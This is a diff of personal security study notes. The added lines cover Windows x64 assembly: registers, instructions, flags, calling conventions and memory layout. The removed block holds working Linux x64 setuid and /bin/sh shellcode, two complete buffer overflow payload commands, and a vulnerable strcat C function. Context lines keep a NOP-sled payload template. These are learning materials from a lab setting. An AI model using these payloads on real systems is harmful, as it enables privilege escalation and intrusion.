@@ -31,6 +31,7 @@
 - Write more than the capacity of the memory
 - Generating cyclic patterns
   - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+
 - Method 1
   - Generate payload with metasploit
   - identify the value in the register (gdb i r)
@@ -57,44 +58,132 @@
   - no operation instruction = does nothing = \x90
   - python -c "print 'NOP'*no_of_nops + 'shellcode' + 'random_data'*no_of_random_data + 'memory address'"
 
+# Assembly in Windows
+[Tryhackme - Windows x64 Assembly](https://tryhackme.com/room/win64assembly)
 
+## Registers
+- Variables
+- Faster to access
+- Bigger ones go to RAM = slower
+- Also user Pointer
+- General-Purposes Registers
+  - RAX = accumulator register = store return value
+    - R Register
+    - E Extended
+    - [Other registers](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture)
+    - [ALL registers](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture)
+  - RBX = base register = used as base pointer
+  - RDX = data register
+  - RCX = counter register = loop
+  - RSI = source index = source pointer in string
+  - RDI = destination index = destination pointer in string
+  - RSP = stack pointer = holds address of the top of the stack
+  - RBP = base pointer  = hold address of the bottom of the stack. To restore to the function
+  - RIP = Instruction Pointer = address of **next line**
 
-```
-Shellcode = 40 = \x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+## Operations
+- Around 1500 instructions
+- Terms
+  - immediate = IM = constant
+  - register = RAX, RBX, AL
+  - memory = location in memory
+  
+- Instruction
+  - (Instruction/Opcode/Mnemonic) <Destination>, <Source>
+  - mov RAX, 5
 
-SETUID: \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+- Common Instructions
+  - mov = move = store data
+  - lea = load effective address = no dereference AND calculate addresses ONLY
+  - push = push onto stack (put on top) ~= copy = save date inside register
+  - pop = take from the stack and store in the destination
+  
+- Arithmetic
+  - inc = increment
+  - dec = decrement
+  - add = add  (source to destinatination)
+  - sub = subtract  
+  - Multiplication
+    - MUL (unsigned) / IMUL (signed) = 
+      - RDX:RAX
+    - DIV / IDIV
+      - RBX:RAX
+  - Flow Control:
+    - cmp = compare
+    - jcc = conditional jumps
+      - JNE, JLE, JG = jump not equal, jump less then, jump greater
+    - call = call
+    - ret = return to caller
+    - NOP = no operation = padding
+  
+- Pointers
+  - [var] = &var = dereference 
+  - LEA = ignores squars []
 
+- jg (jump if greater) x ja (jumb if above)
+  - JB/JNAE = jump if below | not above or equal
+  - JAE/JNB = jump if above or equal / not below
+  - JBE/JNA = jump if below or equal | not above
+  - JA/JNBE = jump if above | not below or equal
 
-run $(python -c "print '\x90'*100 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*40 + 'B'*6")
+## Flags
+- Result of previous operation/comparison
+- Register: EFLAGS / RFLAGS
+- Status
+  - Zero Flag =  result zero
+  - Carry Flag = unsgined
+  - Overflow Flag = signed too big
+  - Sign Flag = result negative
+  - Adjust/Auxiliary Flag = Carry = 
+  - Parity Flag = 1 if last 8 bits = even
+  - Trap Flag = single stepping
 
+## Calling COnvention
+- Several
+- How parameters arge passed to functions
+- Caller = making the call
+- Calee = called function
+- Types: syscakk, stdcall, fastcall, cdecl
+- **Fastcall**
+  - for windows x64
+  - Application Binary Intercace (ABI)
+  - First 4 Parameters: 
+    - Left--to--Right
+    - integer: RCX, RDX, R8, R9
+    - floating: XMM0, XMM1, XMM2, XMM3
+    - others go the stack = right to left
+  - Too big = passed as referece = pointer to data in memory 
+  - Caller allocates space for calee
+  - RAX, RCX, RDX, R8, R9, R10, R11, and XMM0-XMM5 = volatile
+  -  RBX, RBP, RDI, RSI, RSP, R12, R13, R14, R15, and XMM6-XMM15 = nonvolatile
+- [More Info](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019) and [Here](https://docs.microsoft.com/en-us/cpp/build/x64-software-conventions?view=vs-2019)
 
+- cdecl
+  - C Declaration
+  - parameters on stack: right to lefht
+  - RBP saved
+  - return via EAX
+  - caller: cleans stack
 
-run $(python -c "print '\x90'*100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*9 + '\x70\xe2\xff\xff\xff\x7f'")
+## Memory Layout
+- Segment
+  - Stack = non-static local variable
+  - Heap = dynamically allocated
+  - .data = global and static data initialized not zero
+  - .bss = global and static data, uninitialized or zeor
+  - .text = source code
+- TEP = Thread Environment Block = info about currently running thread
+- PEB = Process Enviroment Block = info about the processes and loade modules
+- Stack Frames
+  - chuncks of data: local variables, saved base pointer, return address of the caller and parameters
+  
+| Lower Address  | Local var      | RBP - 8  |
+| -------------- | -------------- | --------|
+|                | Return Address | RBP + 0  |
+|                | saved RBP      | RBP + 8  |
+| Higher Address | Func Parameters| RBP + 16 |
 
-
-
-0x
-
-
-
-void concat_arg(char *string)
-{
-    char buffer[154] = "doggo";
-    strcat(buffer, string);
-    printf("new word is %s\n", buffer);
-    return 0;
-}
-
-int main(int argc, char **argv)
-{
-    concat_arg(argv[1]);
-}
-
-
-
-
-```
-
-
-
+- Endianness
+  - big endian: most significant byte far left
+  - little endien: most significant byte far right
 
